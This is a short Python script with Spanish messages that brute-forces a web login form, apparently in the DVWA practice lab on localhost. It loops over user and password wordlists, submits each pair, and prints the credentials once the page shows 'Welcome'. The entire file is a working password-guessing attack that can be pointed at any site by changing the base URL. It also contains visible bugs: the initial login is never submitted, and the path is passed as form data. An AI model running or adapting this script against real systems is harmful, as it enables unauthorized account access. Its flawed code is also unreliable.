import mechanize

br = mechanize.Browser()
br.set_handle_equiv(False)
br.set_handle_robots(False)

br.addheaders = [("User-Agent", 
                       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")]

BASE_URL = 'http://localhost:8080'
PATH = '/vulnerabilities/brute'

br.open(BASE_URL)
br.select_form(nr=0)
br['username'] = 'admin'
br['password'] = 'password'

br.open(BASE_URL, PATH)

with open('./users.txt', 'r', encoding='utf-8') as f:
    users = f.readlines()

with open('./passwords.txt', 'r', encoding='utf-8') as f:
    passwords = f.readlines()

try:
  if (not users and len(users) == 0) or (not passwords and len(passwords) == 0):
    print("'Debe ingresar un listado de usuarios \n Ó un listado de passwords en el directorio raíz' \n".upper())
  else :
    usersList = [x.strip() for x in users]
    passwordsList = [x.strip() for x in passwords]
except :
  print("Error listas vacias !!!".upper())

def getForceBrute():
    for i in usersList:
      for j in passwordsList:
        br.select_form(nr=0)
        br['username']= i
        br['password'] = j
        br.submit()
        
        resp = br.response().read().decode("utf-8")
        
        if "Welcome" in resp:
          print("=== Cuenta correcta === \n El username es : '{}' y el password es : '{}'".format(i, j))
          return
        else :
          print(" === Cuentas erroneas === \n (User: {} y password: {})\n".format(i, j) )
    
getForceBrute()


